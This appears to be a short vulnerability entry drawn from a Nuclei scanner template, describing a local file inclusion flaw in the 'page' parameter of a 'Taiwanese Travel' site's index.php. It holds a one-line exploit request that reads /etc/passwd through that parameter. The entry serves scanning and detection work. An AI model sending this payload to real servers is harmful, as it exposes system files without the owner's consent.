# Vulnerability: Taiwanese Travel - Local File Inclusion
**Classification:** LFI
**Source:** Nuclei Template (`taiwanese-travel-lfi.yaml`)

## Description
The vulnerability in '/index.php?page=' allows for Local File Inclusion (LFI), granting attackers the ability to include and potentially execute files on the server, compromising the application's security

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/index.php?page=/etc/passwd
```

